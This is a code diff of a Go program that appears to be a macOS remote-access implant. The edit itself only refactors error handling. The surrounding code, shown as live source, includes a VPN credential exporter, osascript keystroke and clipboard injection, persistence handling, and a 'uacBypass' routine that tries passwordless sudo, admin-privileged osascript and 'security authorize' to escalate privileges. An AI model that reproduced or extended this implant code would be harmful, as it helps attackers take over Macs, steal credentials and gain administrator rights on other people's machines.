@@ -952,10 +952,10 @@ func exportVpnCreds() string {
 	return strings.Join(results, "\n")
 }
 
-func remoteInputDispatch(payload string) string {
+func remoteInputDispatch(payload string) (string, error) {
 	// Use osascript to simulate keystrokes on macOS
 	if payload == "" {
-		return "remote_input: no payload provided"
+		return "", fmt.Errorf("remote_input: no payload provided")
 	}
 
 	// Escape the payload for AppleScript
@@ -967,7 +967,7 @@ func remoteInputDispatch(payload string) string {
 		end tell`, escaped)
 
 	if out, err := exec.Command("osascript", "-e", script).CombinedOutput(); err == nil {
-		return fmt.Sprintf("remote_input: sent via osascript keystroke: %s", payload)
+		return fmt.Sprintf("remote_input: sent via osascript keystroke: %s", payload), nil
 	} else {
 		// Try with clipboard as fallback
 		script2 := fmt.Sprintf(
@@ -976,9 +976,9 @@ func remoteInputDispatch(payload string) string {
 				keystroke "v" using command down
 			end tell`, escaped)
 		if out2, err := exec.Command("osascript", "-e", script2).CombinedOutput(); err == nil {
-			return fmt.Sprintf("remote_input: sent via osascript paste: %s", payload)
+			return fmt.Sprintf("remote_input: sent via osascript paste: %s", payload), nil
 		} else {
-			return fmt.Sprintf("remote_input: osascript failed: %v\n%s", err, string(out)+string(out2))
+			return "", fmt.Errorf("remote_input: osascript failed: %v\n%s", err, string(out)+string(out2))
 		}
 	}
 }
@@ -1143,7 +1143,7 @@ func removePersistence(method string, args string) string {
 	}
 }
 
-func uacBypass(method, payload string) string {
+func uacBypass(method, payload string) (string, error) {
 	if payload == "" {
 		payload = "whoami"
 	}
@@ -1153,26 +1153,26 @@ func uacBypass(method, payload string) string {
 	case "sudo", "sudo_nopasswd":
 		out, err := runShell(fmt.Sprintf("sudo -n %s", payload), "")
 		if err == nil {
-			return fmt.Sprintf("uac_bypass: sudo (NOPASSWD) succeeded\n%s", out)
+			return fmt.Sprintf("uac_bypass: sudo (NOPASSWD) succeeded\n%s", out), nil
 		}
-		return fmt.Sprintf("uac_bypass: sudo NOPASSWD failed: %v\n%s", err, out)
+		return fmt.Sprintf("uac_bypass: sudo NOPASSWD failed: %v\n%s", err, out), err
 
 	case "osascript", "osa":
 		// Use osascript to run a command with admin privileges (may prompt)
 		script := fmt.Sprintf(`do shell script "%s" with administrator privileges`, payload)
 		out, err := exec.Command("osascript", "-e", script).CombinedOutput()
 		if err == nil {
-			return fmt.Sprintf("uac_bypass: osascript admin rights succeeded\n%s", string(out))
+			return fmt.Sprintf("uac_bypass: osascript admin rights succeeded\n%s", string(out)), nil
 		}
-		return fmt.Sprintf("uac_bypass: osascript admin rights failed (may have prompted for password): %v\n%s", err, string(out))
+		return fmt.Sprintf("uac_bypass: osascript admin rights failed (may have prompted for password): %v\n%s", err, string(out)), err
 
 	case "security_auth", "authopen":
 		// Use authopen(8) for privilege escalation
 		out, err := exec.Command("security", "authorize", "-uew", "system.preferences").CombinedOutput()
 		if err != nil {
-			return fmt.Sprintf("uac_bypass: security authorize failed: %v\n%s", err, string(out))
+			return fmt.Sprintf("uac_bypass: security authorize failed: %v\n%s", err, string(out)), err
 		}
-		return "uac_bypass: security authorization succeeded (privileged operations may be available)"
+		return "uac_bypass: security authorization succeeded (privileged operations may be available)", nil
 
 	case "all":
 		var sb strings.Builder
@@ -1189,10 +1189,10 @@ func uacBypass(method, payload string) string {
 		} else {
 			sb.WriteString(fmt.Sprintf("[-] Failed: %v\n", err))
 		}
-		return sb.String()
+		return sb.String(), nil
 
 	default:
-		return fmt.Sprintf("uac_bypass: unknown method '%s' on macOS (supported: sudo, osascript, security_auth, all)", method)
+		return "", fmt.Errorf("uac_bypass: unknown method '%s' on macOS (supported: sudo, osascript, security_auth, all)", method)
 	}
 }
 
